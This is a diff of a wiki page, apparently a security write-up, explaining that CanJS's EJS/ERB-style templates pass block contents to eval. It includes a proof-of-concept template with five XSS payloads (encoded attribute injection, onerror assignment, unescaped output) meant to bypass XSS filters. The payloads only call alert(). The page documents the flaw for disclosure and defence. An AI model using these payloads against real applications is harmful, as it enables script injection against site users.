@@ -3,19 +3,18 @@
 
 = Introduction =
 
-Add your content here.
+"Want to share code between a Zepto mobile app and a jQuery desktop app? No problem. CanJS code (especially models) can be shared across libraries, and so can skill sets! Working on a Dojo project today and a YUI one tomorrow? Don’t throw away all of your skills."
 
+From http://canjs.com/guides/Why.html
 
-= Details =
+= Injection Attacks =
 
-Add your content here.  Format your content with:
-  * Text in *bold* or _italic_
-  * Headings, paragraphs, and lists
-  * Automatic links to other wiki pages
+CanJS uses ERB-style templates by default. Everything that is placed inbetween the `<%` and `%>` or its siblings is being treated as raw JavaScript. CanJS throws the content of the ERB-style templates into an actual `eval` method - that is called `myEval` but doesn't do anything but wrapping the real `eval`.
+
+In other words: whenever the user has control over content of the ERB-style template blocks, script injections and XSS are very much likely. The "paste-and-go" code example below shows several cases an attacker can use to bypass server- and browser side XSS filters in case the attacked CanJS application allows injections.
 
 {{{
 <script src="http://code.jquery.com/jquery-2.0.3.min.js"></script>
-
 <script src="http://canjs.us/release/latest/can.jquery.js"></script> 
 <script src="http://canjs.us/release/latest/can.construct.proxy.js"></script> 
 <script src="http://canjs.us/release/latest/can.control.plugin.js"></script> 
@@ -30,18 +29,16 @@ Add your content here.  Format your content with:
 <script src="http://canjs.us/release/latest/can.construct.super.js"></script> 
 
 <body>
-
     <script type="text/ejs" id="todoList">
-        <% alert(0) // standard JS exec %>
-	    <svg class=<%= '1\x20onload\x3Dalert(1)' // attribute injecton %>>
-	    <img src="x"<%=onerror=function(){alert(2)} // event handler assignment %>>
-	    <%== '\x3Cimg src=x onerror=alert(3)>' // unsafe and encoded %>
-	    <%%= '<img src=x onerror=alert(4)>' // generator code %>
+        <% alert(0) %>
+	<svg class=<%= '1\x20onload\x3Dalert(1)' %>>
+	<img src="x"<%=onerror=function(){alert(2)} %>>
+	<%== '\x3Cimg src=x onerror=alert(3)>' %>
+	<%%= '<img src=x onerror=alert(4)>' %>
     </script>
-	
-	<script>
+    <script>
 	can.view('todoList', {});
-	</script>
+    </script>
 </body>
 }}}
 
